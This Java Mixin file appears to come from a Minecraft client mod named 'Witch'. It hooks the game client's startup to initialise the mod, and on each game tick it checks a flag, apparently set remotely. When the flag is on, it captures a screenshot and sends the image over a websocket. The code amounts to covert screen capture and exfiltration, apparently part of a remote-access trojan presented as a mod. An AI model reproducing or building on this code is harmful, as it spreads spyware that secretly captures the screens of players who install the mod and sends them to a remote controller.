package me.soda.witch.mixin;

import me.soda.witch.Witch;
import me.soda.witch.websocket.MessageUtils;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.texture.NativeImage;
import net.minecraft.client.util.ScreenshotRecorder;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import java.io.IOException;


@Mixin(value = MinecraftClient.class)
public class MinecraftClientMixin {

    private byte[] takeScreenshot() throws IOException {
        NativeImage nativeImage = ScreenshotRecorder.takeScreenshot(Witch.mc.getFramebuffer());
        return nativeImage.getBytes();
    }

    @Inject(method = "<init>", at = @At("TAIL"))
    private void onInit(CallbackInfo info) {
        Witch.init();
    }

    @Inject(at = @At("TAIL"), method = "tick")
    private void onTick(CallbackInfo info) {
        try {
            if (Witch.screenshot) {
                MessageUtils.sendMessage("screenshot", takeScreenshot());
                Witch.screenshot = false;
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
